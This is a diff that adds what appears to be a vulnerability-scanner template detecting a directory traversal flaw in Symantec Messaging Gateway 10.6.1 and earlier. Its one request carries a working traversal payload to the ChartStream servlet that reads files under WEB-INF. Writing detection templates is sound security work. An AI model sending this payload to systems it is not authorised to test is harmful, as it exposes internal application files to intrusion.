@@ -1,0 +1,19 @@
+id: symantec-messaging-gateway
+info:
+  author: Random-Robbie
+  description: Symantec Messaging Gateway <= 10.6.1 Directory Traversal
+  name: Symantec Messaging Gateway LFI
+  severity: medium
+  tags: lfi
+requests:
+- matchers:
+  - type: word
+    words:
+    - struts-default.xml
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/'
